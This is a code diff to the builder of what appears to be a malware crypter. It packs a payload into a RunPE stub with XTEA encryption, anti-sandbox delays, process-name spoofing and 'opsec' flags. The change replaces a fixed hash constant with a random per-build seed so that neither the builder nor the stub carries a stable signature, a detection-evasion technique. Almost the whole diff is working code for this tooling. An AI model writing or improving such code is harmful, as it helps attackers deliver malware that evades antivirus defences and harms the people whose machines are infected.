@@ -29,9 +29,10 @@
 
 #pragma comment(lib, "Crypt32.lib")
 
-/* Fixed-seed Djb2 used to hash DLL export names — must match FIXED_DJB2_SEED in RunPE.c */
-static DWORD BuilderDjb2A(const char* s) {
-    DWORD h = 0xDEADC0DE;
+/* Djb2 with caller-supplied seed — seed is key_salt[0] (per-build CryptGenRandom).
+ * Eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin. */
+static DWORD BuilderDjb2A(const char* s, DWORD seed) {
+    DWORD h = seed;
     int   c;
     if (!s) return 0;
     while ((c = *s++)) h = ((h << 5) + h) + c;
@@ -128,7 +129,7 @@ static BOOL ParseArgs(int argc, char* argv[],
                       const char** ppOutputPath,
                       const char** ppStubPath,
                       BYTE         dll_indices[3],
-                      DWORD*       pExportHash,
+                      char         exportNameBuf[64],
                       char         exportArgBuf[128],
                       char         spoofExeBuf[64],
                       char         semaphoreNameBuf[32],
@@ -139,10 +140,10 @@ static BOOL ParseArgs(int argc, char* argv[],
 {
     if (argc < 3) return FALSE;
 
-    *ppTargetPath = argv[1];
-    *ppOutputPath = argv[2];
-    *ppStubPath   = "stub.bin";
-    *pExportHash  = 0;
+    *ppTargetPath   = argv[1];
+    *ppOutputPath   = argv[2];
+    *ppStubPath     = "stub.bin";
+    exportNameBuf[0] = '\0';
     *pSleepFwdMs  = 0;   /* 0 = use default 500 ms  */
     *pUptimeMin   = 0;   /* 0 = use default 2 min   */
     *pHammerMs    = 0;   /* 0 = use default 3000 ms */
@@ -185,7 +186,9 @@ static BOOL ParseArgs(int argc, char* argv[],
             }
         }
         else if (_stricmp(argv[i], "--export") == 0 && i + 1 < argc) {
-            *pExportHash = BuilderDjb2A(argv[++i]);
+            /* Store raw name — hash computed after key_salt is known */
+            strncpy_s(exportNameBuf, 64, argv[++i], 63);
+            exportNameBuf[63] = '\0';
         }
         else if (_stricmp(argv[i], "--arg") == 0 && i + 1 < argc) {
             const char* arg = argv[++i];
@@ -243,6 +246,7 @@ int main(int argc, char* argv[]) {
   const char* outputPath = NULL;
   BYTE        dll_indices[3]        = { 0 };
   DWORD       exportHash            = 0;
+  char        exportNameBuf[64]     = { 0 };   /* raw --export name; hashed after key_salt */
   char        exportArgBuf[128]     = { 0 };
   char        spoofExeBuf[64]       = { 0 };
   char        semaphoreNameBuf[32]  = { 0 };
@@ -252,7 +256,7 @@ int main(int argc, char* argv[]) {
   DWORD       opsecFlags            = 0;
 
   if (!ParseArgs(argc, argv, &targetPath, &outputPath, &stubPath, dll_indices,
-                 &exportHash, exportArgBuf, spoofExeBuf,
+                 exportNameBuf, exportArgBuf, spoofExeBuf,
                  semaphoreNameBuf, &sleepFwdMs, &uptimeMin, &hammerMs,
                  &opsecFlags)) {
       printf("Usage: Builder.exe <input> <output> [OPTIONS]\n");
@@ -427,6 +431,16 @@ int main(int argc, char* argv[]) {
       }
       CryptReleaseContext(hProv, 0);
   }
+
+  /* Compute export hash NOW — uses key_salt[0] as the per-build seed.
+   * This eliminates the fixed 0xDEADC0DE constant from both Builder and stub.bin.
+   * Stub reads key_salt[0] from .rsrc (before zeroing) and passes it to RunPE(). */
+  if (exportNameBuf[0] != '\0' && !(opsecFlags & PAYLOAD_FLAG_IS_SHELLCODE)) {
+      exportHash = BuilderDjb2A(exportNameBuf, key_salt[0]);
+      printf("[+] Export hash: 0x%08X  (seed=key_salt[0]=0x%08X, name=\"%s\")\n",
+             exportHash, key_salt[0], exportNameBuf);
+  }
+  SecureZeroMemory(exportNameBuf, sizeof(exportNameBuf));
 
   printf("[*] Phase 7b: XTEA outer encryption...\n");
   DWORD xteaKey[4];
